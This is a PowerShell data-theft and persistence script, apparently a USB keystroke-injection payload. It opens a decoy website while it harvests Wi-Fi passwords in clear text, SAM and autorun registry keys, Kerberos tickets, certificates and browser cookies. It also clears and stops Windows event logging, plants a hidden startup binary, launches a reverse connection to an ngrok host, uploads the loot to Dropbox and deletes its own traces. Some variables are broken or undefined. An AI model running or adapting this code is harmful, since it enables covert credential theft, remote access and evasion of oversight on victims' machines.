# Get the USB drive letter
$accessToken = "YOUR DROPBOX ACCESS TOKEN"
$drive = 'c:\temp\Collection'
$dropboxFilePath = "/Collection.zip"
$loggingDir = "$drive\Logging"
$loggingFile = "$loggingDir\ExecutionLog.txt"
$lootDir = "$drive\Loot"
$psLoggingFile = "$loggingDir\PowerShellSetup.txt"
$errorLogFile = "$loggingDir\Errors.txt"
$website = "https://www.microsoft.com"
$zipFilePath = "$drive\collection.zip"

# Remote IP and Port
$ngrokAddress = '0.tcp.ngrok.io'
$ngrokPort = '12345'

# Create the logging and loot directories if they don't exist
foreach ($dir in @($loggingDir, $lootDir)) {
    if (-not (Test-Path -Path $dir)) {
        New-Item -Path $dir -ItemType Directory
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Creating Directory: $($dir)"
    }
}

# Loot folders
$lootFolders = @("Antivirus", "Certificates", "Cookies", "Gpo", "Networking", "PowerShell", "Registry", "SystemInfo", "UserInfo", "Wifi")

# Create the loot subdirectories if they don't exist
foreach ($folder in $lootFolders) {
    $fullPath = Join-Path -Path $lootDir -ChildPath $folder
    if (-not (Test-Path -Path $fullPath)) {
        New-Item -Path $fullPath -ItemType Directory
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Creating Loot Subdirectory: $($folder)"
    }
}

# Diversionary Tactic - Open a web site to distract the user while the data collection is running
Start-Process $website

<#
.SYNOPSIS
    Enables PowerShell logging on the system.

.DESCRIPTION
    This script is used to enable PowerShell logging to allow the logging of executed commands and scripts.

.PARAMETER errorLogFile
    The path to the file where error logs will be saved.

.PARAMETER loggingFile
    The path to the file where execution logs will be saved.

.EXAMPLE
    PS> .\Start-WindowsPayload.ps1

    This will execute the script and enable PowerShell logging on the system.

.NOTES
    None
#>
function Enable-PowerShellLogging {
    param (
        [string]
        $errorLogFile,

        [string]
        $loggingFile
    )

    try {
        # We are running these in this order so we can get the logging events before we enable the logging then clear the logs
        Start-Service -Name "EventLog"
        wevtutil cl "Microsoft-Windows-PowerShell/Admin"
        wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}
<#
.SYNOPSIS
    Disables PowerShell logging on the system.

.DESCRIPTION
    This script is used to disable PowerShell logging to prevent the logging of executed commands and scripts.
    This can be useful in scenarios where you want to avoid leaving traces of PowerShell activity.

.PARAMETER errorLogFile
    The path to the file where error logs will be saved.

.PARAMETER loggingFile
    The path to the file where execution logs will be saved.

.EXAMPLE
    PS> .\Start-WindowsPayload.ps1

    This will execute the script and disable PowerShell logging on the system.

.NOTES
    None
#>
function Disable-PowerShellLogging {
    param (
        [string]
        $errorLogFile,

        [string]
        $loggingFile
    )

    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Disabled PowerShell Microsoft-Windows-PowerShell/Admin Event Logging"
        wevtutil cl "Microsoft-Windows-PowerShell/Admin"

        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Disabled PowerShell Microsoft-Windows-PowerShell/Operational Event Logging"
        wevtutil cl "Microsoft-Windows-PowerShell/Operational"

        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Stopping Event Logging Service"
        Stop-Service -Name "EventLog" -Force

        Clear-History -ErrorAction SilentlyContinue
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

<#
.SYNOPSIS
    Retrieves Wi-Fi profile data and saves it to a specified USB drive.

.DESCRIPTION
    The Get-WifiData function retrieves Wi-Fi profile data from the system and saves it to a specified USB drive. It logs each step of the process to a specified logging file.

.PARAMETER errorLogFile
    The path to the file where error logs will be saved.

.PARAMETER loggingFile
    The path to the file where execution logs will be saved.

.PARAMETER lootDir
    The location on the USB drive where the Wi-Fi profile data will be saved.

.EXAMPLE
    PS> Get-WifiData -lootDir "E:\Loot" -loggingFile "C:\Logs\wifi_log.txt" -errorLogFile "C:\Logs\error_log.txt"

    This will execute the function and save the Wi-Fi profile data to the specified USB drive.

.NOTES
    Ensure that the variable $errorLogFile is defined and points to a valid file path before calling this function.
#>
function Get-WifiData {
    param (
        [string]
        $errorLogFile,

        [string]
        $loggingFile,

        [string]
        $lootDir
    )

    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Get Wifi-Data"

        # Get the list of Wi-Fi profiles
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_ -replace "    All User Profile     : ", "" } | ForEach-Object { $_.Trim() }

        # Initialize an array to store Wi-Fi information
        $wifiInfo = @()

        # Loop through each profile to get the SSID and password
        foreach ($profile in $profiles) {
            $profileName = $profile
            $profileInfo = (netsh wlan show profile name=$profile key=clear)
            $password = ($profileInfo | Select-String "Key Content" | ForEach-Object { $_ -replace ".*Key Content            : ", "" }).Trim()
            $wifiInfo += [PSCustomObject]@{
                ProfileName = $profileName
                Password    = $password
            }
        }

        # Format the Wi-Fi information as a table and convert it to a string
        $wifiInfoString = $wifiInfo | Format-Table -AutoSize -Wrap | Out-String

        # Save the Wi-Fi information to a file
        Add-Content -Path "$($lootDir)\wifi\wifiInfo.txt" -Value $wifiInfoString
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}
<#
.SYNOPSIS
    Collects various system information and saves it to specified locations.

.DESCRIPTION
    The Get-Data function collects environment variables, executes a series of system commands, and queries specific registry keys.
    The results are saved to a USB drive and logged in specified log files.

.PARAMETER errorLogFile
    The path to the file where error logs will be saved.

.PARAMETER loggingFile
    The path to the file where execution logs will be saved.

.PARAMETER lootDir
    The location on the USB drive where the collected data will be saved.

.EXAMPLE
    PS> Get-Data -lootDir "E:\Loot" -loggingFile "C:\Logs\execution.log" -errorLogFile "C:\Logs\error.log"

.NOTES
    None
#>
function Get-Data {
    param (
        [string]
        $errorLogFile,

        [string]
        $loggingFile,

        [string]
        $lootDir
    )

    try {
        # Collect environment variables
        $envVars = Get-ChildItem env: | Out-String
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Get-ChildItem env:"
        Add-Content -Path "$($lootDir)\UserInfo\envVars.txt" -Value $envVars

        # List of commands to execute
        $commands = @(
            "Get-LocalUser | Format-List",
            "net localgroup administrators",
            "Get-ChildItem Cert:\CurrentUser\My | Format-List *",
            "Get-ChildItem Cert:\LocalMachine\My | Format-List *",
            "whoami",
            "systeminfo",
            "hostname",
            "whoami /priv",
            "net users",
            "net localgroup",
            "klist",
            "klist tgt",
            "nslookup .",
            "gpresult /R",
            "Get-WmiObject Win32_ComputerSystem",
            "Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, PathName",
            "Get-WmiObject Win32_StartupCommand",
            "Get-ComputerInfo | Select-Object *",
            "Get-Process -IncludeUserName | Select-Object ID, SI, ProcessName, UserName",
            "Get-WmiObject Win32_Share",
            "ipconfig /all",
            "netstat -ano",
            "Get-EventLog -LogName Security -Newest 50",
            "Get-ScheduledTask | Select-Object TaskName, State, Actions",
            "Get-NetIPConfiguration -Detailed",
            "Get-NetIPAddress -AddressFamily IPv4 | Select-Object *",
            "Get-NetFirewallRule",
            "Get-WmiObject -Namespace 'Root\SecurityCenter2' -Class 'AntiVirusProduct'",
            "Get-MpComputerStatus"
        )

        # Execute each command
        foreach ($command in $commands) {
            try {
                Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: $($command)"
                try {
                    $output = Invoke-Expression $command | Out-String
                }
                catch {
                    Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
                    continue
                }

                switch -Regex ($command) {
                    "ipconfig|netstat|Get-NetIPConfiguration|Get-NetIPAddress|Get-NetFirewallRule|nslookup" {
                        $lootFile = "$($lootDir)\Networking\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                    }
                    "AntiVirus|Get-MpComputerStatus" {
                        $lootFile = "$($lootDir)\Antivirus\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                    }
                    "gpresult" {
                        $lootFile = "$($lootDir)\Gpo\gpresult.txt"
                    }
                    "Get-LocalUser|whoami|net users|net localgroup|Get-Process|net localgroup" {
                        $lootFile = "$($lootDir)\UserInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                    }
                    "Cert" {
                        $lootFile = if ($command -match "CurrentUser") {
                            "$($lootDir)\Certificates\CurrentUser_Certificates.txt"
                        }
                        else {
                            "$($lootDir)\Certificates\LocalMachine_Certificates.txt"
                        }
                    }
                    "Get-WmiObject Win32_ComputerSystem|Get-WmiObject Win32_Service|Get-WmiObject Win32_StartupCommand|Get-ComputerInfo|Get-Process|Get-WmiObject Win32_Share" {
                        $lootFile = "$($lootDir)\SystemInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                    }
                    default {
                        $lootFile = "$($lootDir)\SystemInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                    }
                }

                Add-Content -Path $lootFile -Value "Executed: $command`n"
                Add-Content -Path $lootFile -Value ($output.Trim() + "`n")
            }
            catch {
                Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
            }
        }

        # Registry keys to query
        $regKeys = @(
            'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion',
            'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
            'HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName',
            'HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation',
            'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces',
            'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList',
            'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
            'HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
            'HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKLM\SAM\Domains\Account\Users',
            'HKCU\SAM\Domains\Account\Users',
            'HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR',
            'HKLM\SYSTEM\CurrentControlSet\Enum\USB',
            'HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall'
        )

        # Query each registry key
        foreach ($regKey in $regKeys) {
            try {
                Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: reg query $($regKey)"
                $output = reg query $regKey /s | Out-String
                $lootFile = "$($lootDir)\Registry\$($regKey -replace '[^a-zA-Z0-9]', '_').txt"
                Add-Content -Path $lootFile -Value "Querying: $regKey"
                Add-Content -Path $lootFile -Value ($output.Trim() + "`n")
            }
            catch {
                Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
            }
        }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

<#
.SYNOPSIS
    Retrieves cookies from Microsoft Edge and saves them to a specified USB drive.

.DESCRIPTION
    The Get-WebCookieFile function stops the Microsoft Edge process, copies the cookies file from the local Edge user data directory to a specified USB drive, and then restarts the Edge process. It logs each step of the process to a specified logging file.

.PARAMETER loggingFile
    The path to the log file where the function logs its actions.

.PARAMETER lootDir
    The location on the USB drive where the cookies file will be copied.

.EXAMPLE
    PS> Get-WebCookieFile -lootDir "E:\Loot" -loggingFile "C:\Logs\edge_log.txt"

.NOTES
    This function requires administrative privileges to stop and start the Edge process.
#>
function Get-WebCookieFile {
    param (
        [string]
        $loggingFile,

        [string]
        $lootDir
    )

    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Stop-Process MSEdge"
        Stop-Process -Name "msedge" -Force
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Get-WebCookieFile"
        Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" -Destination "$($lootDir)\Cookies"
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Restarting Edge Process"
        Start-Process msedge.exe --restore-session
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

<#
.SYNOPSIS
    Retrieves PowerShell command history and saves it to a specified location.

.DESCRIPTION
    The Get-PowerShellHistory function retrieves the command history from PowerShell and saves it to a specified location on the USB drive.
    It logs each step of the process to a specified logging file.

.PARAMETER drive
    The USB drive letter where the PowerShell history file will be saved.

.PARAMETER errorLogFile
    The path to the file where error logs will be saved.

.PARAMETER loggingFile
    The path to the log file where the function logs its actions.

.EXAMPLE
    PS> Get-PowerShellHistory -drive "E:" -loggingFile "C:\Logs\history_log.txt" -errorLogFile "C:\Logs\error.log"

    This will execute the function and save the PowerShell command history to the specified USB drive.

.NOTES
    Ensure that the variable $errorLogFile is defined and points to a valid file path before calling this function.
#>
function Get-PowerShellHistory {
    param (
        [string]
        $drive,

        [string]
        $errorLogFile,

        [string]
        $loggingFile
    )

    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Get-PowerShellHistory"
        Get-History | Out-String | Add-Content -Path "$($lootDir)\PowerShell\PowerShellHistory.txt"
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

# Logging
<#
.SYNOPSIS
    Logs error messages to a specified error log file.

.DESCRIPTION
    The Write-Error function takes an error message and an error log file path as parameters and appends the error details to the specified log file with a timestamp.

.PARAMETER errorLogFile
    The path to the error log file where the error message will be appended.

.PARAMETER errMsg
    The error message to be logged.

.EXAMPLE
    PS> Write-Error -errMsg "An unexpected error occurred." -errorLogFile "C:\Logs\error.log"

.NOTES
    Ensure that the variable $errorLogFile is defined and points to a valid file path before calling this function.
#>
function Write-ToErrorLog {
    param (
        [object]
        $errMsg,

        [string]
        $errorLogFile
    )
    $lines = $errMsg.ScriptStackTrace -split "\n"
    $errorDetails = @(
        "Error: in $($lines[1])",
        "Category: $($errMsg.CategoryInfo)",
        "Message: $($errMsg.Exception.Message)"
    )
    Add-Content -Path $errorLogFile -Value "[$(Get-Date)] - $($errorDetails)`n"
}

<#
.SYNOPSIS
    Configures PowerShell settings and installs necessary package providers.

.DESCRIPTION
    This function sets the PowerShell execution policy to Bypass, installs the NuGet package provider, registers the NuGet package source, and downloads a script from a specified URL. Errors encountered during execution are logged to a specified error log file.

.PARAMETER errorLogFile
    Specifies the path to the error log file where any errors encountered during execution will be logged.

.PARAMETER loggingFile
    Specifies the path to the logging file (not utilized in the current implementation).

.PARAMETER psLoggingFile
    Specifies the path to the PowerShell logging file.

.EXAMPLE
    PS> New-PowerShellSetup -loggingFile "C:\Logs\setup.log" -psLoggingFile "C:\Logs\ps_setup.log" -errorLogFile "C:\Logs\error.log"

.NOTES
    None
#>
function New-PowerShellSetup {
    param (
        [string]
        $errorLogFile,

        [string]
        $loggingFile,

        [string]
        $psLoggingFile
    )

    # Configure Powershell
    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Set-ExecutionPolicy -ExecutionPolicy Unrestricted"
        $output = Set-ExecutionPolicy -ExecutionPolicy Bypass -Force -ErrorAction Continue -Verbose 4>&1
        $output -split "`n" | ForEach-Object { Add-Content -Path $psLoggingFile -Value "[$(Get-Date)] - Output: $_" }

        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Install-PackageProvider -Name NuGet"
        $output = Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -ErrorAction Continue -Verbose 4>&1
        $output -split "`n" | ForEach-Object { Add-Content -Path $psLoggingFile -Value "[$(Get-Date)] - Output: $_" }

        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Register-PackageSource -Name NuGet -ProviderName NuGet -Location 'https://www.nuget.org/api/v2' -Trusted"
        $output = Register-PackageSource -Name NuGet -ProviderName NuGet -Location 'https://www.nuget.org/api/v2' -Trusted -Force -ErrorAction Continue -Verbose 4>&1
        $output -split "`n" | ForEach-Object { Add-Content -Path $psLoggingFile -Value "[$(Get-Date)] - Output: $_" }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}
# Add-Persistence
<#
.SYNOPSIS
    This script adds persistence by modifying the startup registry key and downloading/executing a payload.

.DESCRIPTION
    The script performs the following actions:
    1. Retrieves the USB drive letter labeled 'DUCKY'.
    2. Logs execution steps and errors to specific log files on the USB drive.
    3. Enables all privileges using an external script.
    4. Adds a script to the Windows startup registry key.
    5. Downloads a ZIP file containing the payload from a specified URI.
    6. Extracts the ZIP file to a specified directory.
    7. Deletes the ZIP file after extraction.
    8. Hides and sets files as read-only.
    9. Executes the payload manually.

.PARAMETER drive
    Specifies the USB drive to be used.

.PARAMETER errorLogFile
    Specifies the path to the error log file where any errors encountered during execution will be logged.

.PARAMETER loggingFile
    Specifies the path to the logging file.

.EXAMPLE
    PS> .\Add-WindowsPersistence.ps1 -drive "E:" -loggingFile "C:\Logs\execution.log" -errorLogFile "C:\Logs\errors.log"

    Executes the script to add persistence and log the steps.

.NOTES
    The script requires administrative privileges to modify the registry and download files to protected directories.
    Ensure the USB drive is labeled 'DUCKY' and contains the necessary directories for logging.
#>
function Add-WindowsPersistence {
    param (
        [string]
        $drive,

        [string]
        $errorLogFile,

        [string]
        $loggingFile,

        [string]
        $ngrokAddress,

        [string]
        $ngrokPort
    )

    try {
        try {
            # Add the script to the startup registry key
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Add startup registry key"
            Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name UpdatePowerShell -Value 'C:\\Program Files\\WindowsPowerShell\\Modules\\PSStartUpdate.exe'
        }
        catch {
            Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
        }
        try {
            # Unzip files and delete archive
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Unzipped files to C:\Program Files\WindowsPowerShell\Modules"
            Expand-Archive -Path "$($usbDrive)\Binaries\PSStartUpdate.zip" -DestinationPath 'C:\Program Files\WindowsPowerShell\Modules' -Force

            # Sleep for 10 seconds to allow full archive extraction
            Start-Sleep -Seconds 5
        }
        catch {
            Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
        }
        try {
            # Hide files
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Hide Powershell files"
            Set-ItemProperty -Path 'C:\Program Files\WindowsPowerShell\Modules\PSGetModules.ps1' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::ReadOnly)
            Set-ItemProperty -Path 'C:\Program Files\WindowsPowerShell\Modules\PSStartUpdate.exe' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::ReadOnly)
        }
        catch {
            Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
        }

        try {
            # Manually execute the payload. The scheduled task will execute the payload on startup which is PSStartUpdate.exe
            Add-Type -TypeDefinition ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content -Path 'C:\Program Files\WindowsPowerShell\Modules\PSGetModules.ps1' -Raw)))) -Language Csharp

            # Add NGROK address and port below
            [ConnectBack.Program]::Main(@("$:ngrokAddress", "$ngrokPort", 'Connection from: $env:ComputerName'))
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Payload"
        }
        catch {
            Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
        }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}
# Cleanup
<#
.SYNOPSIS
    Cleans up PowerShell history, session data, and deletes the archive.

.DESCRIPTION
    This function removes the PowerShell history file, clears the session history, and deletes the specified archive file to prevent leaving traces of executed commands and collected data.

.PARAMETER errorLogFile
    Specifies the path to the error log file where any errors encountered during execution will be logged.

.PARAMETER loggingFile
    Specifies the path to the logging file.

.PARAMETER archivePath
    Specifies the path to the archive file that will be deleted.

.EXAMPLE
    PS> Start-WindowsCleanup -loggingFile "C:\Logs\cleanup.log" -errorLogFile "C:\Logs\error.log" -archivePath "C:\temp\collection.zip"

    This will execute the cleanup function, delete the archive, and log the steps.
#>
function Start-WindowsCleanup {
    param (
        [string]
        $errorLogFile,

        [string]
        $loggingFile,

        [string]
        $archivePath
    )

    try {
        $historyPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path -Path $historyPath) {
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Removing PowerShell history file from $($historyPath)"
            Remove-Item -Path $historyPath -Force -ErrorAction SilentlyContinue
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Clearing Windows PowerShell session history"
        }

        if (Test-Path -Path $zipFilePath) {
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Deleting archive file from $($zipFilePath)"
            Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
        }

        if (Test-Path -Path $drive) {
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Removing directory $($drive)"
            Remove-Item -Path $drive -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

# Dropbox Upload
<#
.SYNOPSIS
    Creates a compressed archive of a specified directory.

.DESCRIPTION
    The New-CollectionArchive function compresses the contents of a specified directory into a ZIP file and saves it to a specified destination path.

.PARAMETER drive
    The path to the directory whose contents will be compressed.

.PARAMETER destinationPath
    The path where the resulting ZIP file will be saved.

.PARAMETER loggingFile
    The path to the log file where the function logs its actions.

.EXAMPLE
    PS> New-CollectionArchive -sourceDir "C:\temp\Collection" -destinationPath "C:\temp\collection.zip" -loggingFile "C:\Logs\archive_log.txt"

    This will compress the contents of the "C:\temp\Collection" directory into a ZIP file and save it as "C:\temp\collection.zip".

.NOTES
    Ensure that the specified source directory exists and the destination path is valid before calling this function.
#>
function New-CollectionArchive {
    param (
        [string]
        $drive,

        [string]
        $destinationPath,

        [string]
        $loggingFile
    )

    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Compressing $drive to $destinationPath"
        Compress-Archive -Path "$drive\*" -DestinationPath $destinationPath -Force
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Compression completed"
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

<#
.SYNOPSIS
    Uploads data to a specified URL.

.DESCRIPTION
    The Submit-DataCollection function uploads a file to Dropbox using an HTTP POST request. It logs the upload process and handles any errors that occur during the upload.

.PARAMETER dropboxFilePath
    The path to the file that will be uploaded to Dropbox.

.PARAMETER errorLogFile
    The path to the error log file where any errors encountered during execution will be logged.

.PARAMETER zipFilePath
    The path to the zip file that will be uploaded.

.PARAMETER headers
    The headers to include in the HTTP request.

.PARAMETER loggingFile
    The path to the log file where the function logs its actions.

.EXAMPLE
    PS> Submit-DataCollection -zipFilePath "C:\temp\collection.zip" -dropboxFilePath "/collection.zip" -headers $headers -loggingFile "C:\Logs\upload_log.txt" -errorLogFile "C:\Logs\error.log"

    This will upload the file "C:\temp\collection.zip" to the specified Dropbox path and log the process.

.NOTES
    Ensure that the specified file path exists and the upload URL is valid before calling this function.
#>
function Submit-DataCollection {
    param (
        [string]
        $dropboxFilePath,

        [string]
        $errorLogFile,

        [string]
        $zipFilePath,

        [hashtable]
        $headers,

        [string]
        $loggingFile
    )

    try {
        # Required - Set here your Dropbox Token
        $authHeader = @{Authorization = "Bearer $accessToken" }
        $uploadUrl = "https://content.dropboxapi.com/2/files/upload"

        $authHeader.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
        $authHeader.Add("Content-Type", "application/octet-stream")

        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Reading file content from $($zipFilePath)"
        $fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)

        try {
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Uploading file to Dropbox"
            $response = Invoke-RestMethod -Uri $uploadUrl -Headers $authHeader -Method Post -Body $fileContent
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: File uploaded successfully"
            Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Response: $($response | Out-String)"
        }
        catch {
            Write-Error "Failed to upload file: $_"
        }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
}

<#
.SYNOPSIS
    Executes a series of functions and scripts, logging their execution and handling errors.

.DESCRIPTION
    This script iterates through a list of functions and executes each one, logging the execution time and function name.
    If an error occurs during the execution of any function, it logs the error message. After executing the functions, it
    iterates through a list of scripts, constructs their paths, and executes them using PowerShell logging the execution
    time and script path. If an error occurs during the execution of any script, it logs the error message.

.PARAMETER errorLogFile
    Specifies the path to the error log file where any errors encountered during execution will be logged.

.PARAMETER loggingFile
    Specifies the path to the logging file.

.PARAMETER lootDir
    Specifies the location on the USB drive where the collected data will be saved.

.PARAMETER ngrokAddress
    Specifies the address for ngrok.

.PARAMETER ngrokPort
    Specifies the port for ngrok.

.PARAMETER psLoggingFile
    Specifies the path to the PowerShell logging file.

.EXAMPLE
    PS> $functions = @("Get-WifiData", "Get-Data", "Get-WebCookieFile")
    PS> $scripts = @("Scripts\Add-WindowsPersistence.ps1", "Scripts\Start-Cleanup.ps1")
    PS> $drive = "E:\"
    PS> $loggingFile = "E:\log.txt"
    PS> $errorLogFile = "E:\errorLog.txt"

    # Execute the script
    # (Assuming the script content is saved in a .ps1 file and executed in PowerShell)
#>
$semaphore = [System.Threading.Semaphore]::new(1, 1)
$functions = @("Disable-PowerShellLogging", "Add-WindowsPersistence", "Get-Credentials", "Get-Data", "Get-WebCookieFile", "Get-PowerShellHistory", "Get-WifiData", "New-PowerShellSetup", 'New-CollectionArchive')
foreach ($function in $functions) {
    $semaphore.WaitOne()
    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: $($function)"
        if ($function -eq "New-PowerShellSetup") {
            & $function -psLoggingFile $psLoggingFile -errorLogFile $errorLogFile -loggingFile $loggingFile
        }
        elseif ($function -eq "Disable-PowerShellLogging" -or $function -eq "Enable-PowerShellLogging") {
            & $function -loggingFile $loggingFile -errorLogFile $errorLogFile
        }
        elseif ($function -eq "New-CollectionArchive") {
            & $function -drive $drive -destinationPath "$($drive)\collection.zip" -loggingFile $loggingFile -errorLogFile $errorLogFile
        }
        elseif ($function -eq "Add-WindowsPersistence") {
            & $function -drive $drive -ngrokAddress $ngrokAddress -ngrokPort $ngrokPort -loggingFile $loggingFile -errorLogFile $errorLogFile
        }
        else {
            & $function -lootDir $lootDir -loggingFile $loggingFile -errorLogFile $errorLogFile
        }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
    finally {
        # Release the semaphore after the function completes
        $semaphore.Release()
    }
}

# Perform cleanup and enable logging after all functions have been executed
$cleanupFunctions = @("Submit-DataCollection", "Start-WindowsCleanup", "Enable-PowerShellLogging")
$semaphore = [System.Threading.Semaphore]::new(1, 1)
foreach ($cleanupFunction in $cleanupFunctions) {
    $semaphore.WaitOne()
    try {
        Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: $($cleanupFunction)"
        if ($cleanupFunction -eq "Submit-DataCollection") {
            & $cleanupFunction -zipFilePath $zipFilePath -dropboxFilePath $dropboxFilePath -headers $headers -loggingFile $loggingFile -errorLogFile $errorLogFile
        }
        else {
            & $cleanupFunction -loggingFile $loggingFile -errorLogFile $errorLogFile
        }
    }
    catch {
        Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
    }
    finally {
        # Release the semaphore after the function completes
        $semaphore.Release()
    }

    # Clear PowerShell history
    Clear-History -ErrorAction SilentlyContinue
}

